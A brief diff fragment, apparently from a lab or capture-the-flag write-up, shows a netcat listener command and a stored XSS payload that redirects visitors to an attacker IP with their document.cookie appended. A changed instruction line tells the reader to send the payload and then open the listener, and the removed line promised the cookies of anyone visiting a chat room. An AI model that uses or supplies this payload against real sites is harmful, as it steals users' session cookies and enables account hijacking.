@@ -9,4 +9,4 @@ nc -nlvp 4444
 ````
 <script>window.location='http://10.13.**.**:4444/?cookie='+document.cookie</script>
 ````
-- Page should reload and you should have the cookie of anyone that visits the chat room 
+- Note: Send the payload and then open the listener 
